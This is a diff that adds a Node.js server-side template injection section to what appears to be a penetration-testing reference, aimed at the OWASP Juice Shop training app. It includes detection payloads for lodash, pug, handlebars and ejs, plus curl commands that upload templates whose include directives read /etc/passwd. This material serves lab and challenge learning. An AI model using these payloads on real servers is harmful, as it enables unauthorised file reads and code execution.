@@ -66,6 +66,63 @@ curl -s "https://<target>/?name=<% print(7*7) %>" | grep "49" # Mako
 curl -s 'https://<target>/?name={% set x = 7*7 %}{{x}}' | grep "49" # Tornado
 ```
 
+## Node.js Template-Engine SSTI (lodash / pug / hbs / ejs)
+
+JavaScript/Node servers (Express + a template engine) are a distinct SSTI surface the curly-brace probes above mostly miss — Node engines use their own delimiters. The classic reachable target is **OWASP Juice Shop** (`http://localhost:3000`): user-controlled fields and **uploaded templates** are rendered server-side, so injecting engine syntax into a value that is later compiled hits the runtime. Unlocks the **"SSTi"** and **"Local File Read"** challenges.
+
+### Detection payload per engine
+
+| Engine (Node) | Detection payload | Marker | Notes |
+|---|---|---|---|
+| lodash `template` | `${7*7}` or `<%= 7*7 %>` | `49` | lodash interpolates `${...}` and ERB-style `<%= %>`; the `<%= %>` form is the Juice Shop SSTi trigger |
+| pug (ex-Jade) | `#{7*7}` | `49` | interpolation `#{}`; buffered-code `= 7*7` also evals |
+| handlebars (hbs) | `{{#with "s" as \|s\|}}{{s.sub "h" 0 1}}{{/with}}` | `h` | `{{7*7}}` does NOT eval (no math); use the `with`/helper probe |
+| ejs | `<%= 7*7 %>` | `49` | scriptlet `<% %>`; output tag `<%= %>` |
+
+### How the render endpoint / upload reaches them
+
+Juice Shop renders user-supplied template content server-side. Two reliable paths:
+
+```bash
+# 1) Profile / user-controlled field rendered back through lodash template.
+#    Set username (or any reflected field) to the lodash SSTi probe, then view the page.
+curl -s -X POST "http://localhost:3000/profile" \
+  -b "token=<JWT>" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'username=<%= 7*7 %>' | grep "49"   # 49 => lodash SSTI (SSTi challenge)
+
+# 2) Uploaded template file compiled by the server (pug/ejs/hbs render path).
+#    A *.pug/*.ejs uploaded and then rendered runs its embedded code.
+printf '#{7*7}\n' > probe.pug
+curl -s -X POST "http://localhost:3000/file-upload" -F "file=@probe.pug" -b "token=<JWT>"
+# then trigger the render endpoint that compiles the uploaded template -> body contains 49
+
+cat > probe.ejs << 'EOF'
+<%= 7*7 %>
+EOF
+curl -s -X POST "http://localhost:3000/file-upload" -F "file=@probe.ejs" -b "token=<JWT>"
+```
+
+### include-directive path traversal -> Local File Read
+
+pug and ejs both support an `include` directive that pulls a file from disk and inlines it into the render. Pointing it at an absolute/traversal path makes the engine read and return arbitrary files — and a missing/unreadable path throws a 500 whose stack trace also leaks contents/paths. This is the **"Local File Read"** challenge.
+
+```bash
+# pug include traversal -> server reads /etc/passwd into the rendered output
+printf 'include /etc/passwd\n' > lfr.pug
+curl -s -X POST "http://localhost:3000/file-upload" -F "file=@lfr.pug" -b "token=<JWT>"
+# render the uploaded pug -> response body contains root:x:0:0 (file read) OR HTTP 500 leaking the path
+
+# ejs include traversal (relative climb out of the views dir)
+cat > lfr.ejs << 'EOF'
+<%- include('/etc/passwd') %>
+EOF
+curl -s -X POST "http://localhost:3000/file-upload" -F "file=@lfr.ejs" -b "token=<JWT>"
+# 200 with file contents == Local File Read; 500 with ENOENT/path in trace == still confirms the include sink
+```
+
+A `49` (lodash/pug/ejs) or `h` (hbs) marker proves the Node SSTI; the `include` file-read proves Local File Read. Both are valid Juice Shop challenge solves.
+
 ### Context detection
 
 SSTI can land in HTML, JS-string, or attribute contexts — wrap probes in markers to confirm where it renders:
